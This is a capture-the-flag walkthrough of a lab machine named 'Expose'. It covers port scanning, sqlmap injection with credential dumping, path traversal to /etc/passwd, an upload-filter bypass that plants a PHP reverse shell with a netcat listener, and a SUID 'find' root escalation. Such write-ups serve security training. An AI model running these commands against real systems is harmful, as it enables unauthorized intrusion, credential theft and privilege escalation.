# Expose

### Expose
Initial scan shows ports 21,22,53,1337,1883 open:

    # Nmap 7.94SVN scan initiated Mon Oct 21 04:59:00 2024 as: nmap -p22,21,53,1337,1883 -sV -sC -oN scan 10.10.14.250
    Nmap scan report for 10.10.14.250
    Host is up (0.094s latency).
    
    PORT     STATE SERVICE                 VERSION
    21/tcp   open  ftp                     vsftpd 2.0.8 or later
    | ftp-syst: 
    |   STAT: 
    | FTP server status:
    |      Connected to ::ffff:10.14.90.188
    |      Logged in as ftp
    |      TYPE: ASCII
    |      No session bandwidth limit
    |      Session timeout in seconds is 300
    |      Control connection is plain text
    |      Data connections will be plain text
    |      At session startup, client count was 2
    |      vsFTPd 3.0.3 - secure, fast, stable
    |_End of status
    |_ftp-anon: Anonymous FTP login allowed (FTP code 230)
    22/tcp   open  ssh                     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   3072 42:80:cd:c4:cd:d9:90:22:fc:b6:74:9e:87:4b:29:d1 (RSA)
    |   256 3a:24:e7:cb:27:14:ff:41:ec:26:8d:9b:9d:d3:bb:f1 (ECDSA)
    |_  256 3f:f6:95:a6:bc:28:f2:71:83:4a:39:0f:6f:c0:5e:2f (ED25519)
    53/tcp   open  domain                  ISC BIND 9.16.1 (Ubuntu Linux)
    | dns-nsid: 
    |_  bind.version: 9.16.1-Ubuntu
    1337/tcp open  http                    Apache httpd 2.4.41 ((Ubuntu))
    |_http-title: EXPOSED
    |_http-server-header: Apache/2.4.41 (Ubuntu)
    1883/tcp open  mosquitto version 1.6.9
    | mqtt-subscribe: 
    |   Topics and their most recent payloads: 
    |     $SYS/broker/uptime: 220 seconds
    |     $SYS/broker/bytes/received: 69
    |     $SYS/broker/messages/stored: 31
    |     $SYS/broker/clients/maximum: 1
    |     $SYS/broker/load/connections/5min: 0.39
    |     $SYS/broker/load/messages/received/1min: 2.74
    |     $SYS/broker/clients/connected: 1
    |     $SYS/broker/publish/messages/sent: 11
    |     $SYS/broker/clients/inactive: 0
    |     $SYS/broker/load/messages/sent/1min: 12.79
    |     $SYS/broker/load/bytes/received/15min: 4.57
    |     $SYS/broker/load/messages/sent/5min: 2.75
    |     $SYS/broker/heap/current: 51056
    |     $SYS/broker/clients/active: 1
    |     $SYS/broker/clients/disconnected: 0
    |     $SYS/broker/messages/received: 3
    |     $SYS/broker/messages/sent: 14
    |     $SYS/broker/load/sockets/15min: 0.26
    |     $SYS/broker/load/publish/sent/5min: 2.16
    |     $SYS/broker/heap/maximum: 51456
    |     $SYS/broker/bytes/sent: 406
    |     $SYS/broker/store/messages/count: 31
    |     $SYS/broker/subscriptions/count: 2
    |     $SYS/broker/load/bytes/sent/15min: 26.90
    |     $SYS/broker/version: mosquitto version 1.6.9
    |     $SYS/broker/load/publish/sent/15min: 0.73
    |     $SYS/broker/load/bytes/received/5min: 13.55
    |     $SYS/broker/publish/bytes/sent: 60
    |     $SYS/broker/load/messages/received/15min: 0.20
    |     $SYS/broker/load/sockets/5min: 0.71
    |     $SYS/broker/load/bytes/received/1min: 63.04
    |     $SYS/broker/load/sockets/1min: 2.56
    |     $SYS/broker/load/connections/1min: 1.83
    |     $SYS/broker/clients/total: 1
    |     $SYS/broker/load/messages/sent/15min: 0.93
    |     $SYS/broker/load/bytes/sent/5min: 79.73
    |     $SYS/broker/load/connections/15min: 0.13
    |     $SYS/broker/load/bytes/sent/1min: 370.96
    |     $SYS/broker/retained messages/count: 35
    |     $SYS/broker/load/publish/sent/1min: 10.05
    |     $SYS/broker/load/messages/received/5min: 0.59
    |_    $SYS/broker/store/messages/bytes: 146
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

After some enumeration, I found some directories on the webserver on port 1337:<br/>
![image](https://github.com/user-attachments/assets/d4edbd87-6078-467b-bc4a-39a657d01491)<br />
Some of them are just decoys, the real login page is at `admin_101`. <br />
![image](https://github.com/user-attachments/assets/40bbd386-3370-404e-9df8-a9df56aa1935)<br />
This login page is vulnerable to sqlinjection. I'll use sqlmap to exploit it. Open burpsuite and capture the request, then run the following command: `sqlmap -r request --dbs`, `sqlmap -r request -D expose --tables --dump`. <br />
Inside the `expose` database, I found two tables, users and config.<br />
Here's what I found:

    hacker@root.thm:VeryDifficultPassword!!#@#@!#!@#1231
    /file1010111/index.php — easytohack
    /upload-cv00101011/index.php
The first set of credential seems useless, let's try accessing `/file1010111/index.php`:<br />
![image](https://github.com/user-attachments/assets/ad929770-3222-426a-8e36-ecdf7ffb208c)<br />
Looking at the source code of the page, there's a hint:<br />
![image](https://github.com/user-attachments/assets/c1072135-65d0-434f-932c-1cae76972144)<br />
Before trying enumerating files, I decided to first try if it is vulnerable to path traversal, and it is! <br />
![image](https://github.com/user-attachments/assets/d7614a40-edd4-4a29-a002-342fa33b7a78)<br />
Inside the `/etc/passwd`, there's a user called `zeamkish`. If I now visit `/upload-cv00101011/index.php`, it asks for a password, with a hint suggesting that it's a user of this computer starting with letter z, which is of course `zeamkish`.<br />
This page prompts to a file upload. Looking at the source code, there's a front end filter that filters out everything that is not .png or .jpg.<br />
![image](https://github.com/user-attachments/assets/81db1e27-1f58-4155-be63-7a8b15f66eb8)<br />
But this is just a frontend filter. To bypass it we can use burpsuite and change the file extension to .php before forwarding it. I'm using the php reverse shell from pentestmonkey. <br />
![image](https://github.com/user-attachments/assets/34db6032-edde-4e64-80b6-43914d6e6906)<br />
Change the extension to .php and upload it<br />
![image](https://github.com/user-attachments/assets/2251a947-9e9c-4fd2-bdaa-c5d272f068d6)<br />
![image](https://github.com/user-attachments/assets/d7cff851-68af-4bd7-ac7c-715a9a9f6ace)<br />
So now open a netcat listener, `nc -lnvp 4444` and open `http://10.10.29.77:1337/upload-cv00101011/upload_thm_1001/rev.php`:<br />
![image](https://github.com/user-attachments/assets/b72f18c8-95d5-4b89-9e64-a9ff2ffeb469)<br />
Inside zeamkish's home directory, there are his ssh credentials:<br />
![image](https://github.com/user-attachments/assets/d879a1d8-f327-454b-a0bc-76f180bb617f)<br />
`zeamkish:easytohack@123`.<br />
I then run linpeas to enumerate possible privesc vectors and found this:<br />
![image](https://github.com/user-attachments/assets/72bcffe6-ae94-4359-b3f2-6f474fbb0f00)<br />
GTFObins is very good with this kind of SUID. Just run `find . -exec /bin/sh -p \; -quit` and get root flag! 
